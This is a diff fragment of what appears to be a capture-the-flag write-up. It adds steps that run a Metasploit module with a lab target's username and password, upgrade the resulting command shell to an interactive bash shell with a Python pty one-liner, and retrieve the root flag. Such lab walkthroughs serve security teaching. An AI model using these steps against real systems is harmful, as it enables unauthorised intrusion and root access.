@@ -192,8 +192,25 @@ set lhost tun0
 set ssl true
 set username Matt
 set password computer2008
+run
+```
+
+<p align="center">
+  <img src="screenshots/22.png" width="738">
+</p>
+
+Once the Command Shell is opened, type the following to get an interactive shell:
 
 ```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+<p align="center">
+  <img src="screenshots/23.png" width="738">
+</p>
+
+
+Finally the root flag is retrieved.
 
 
 
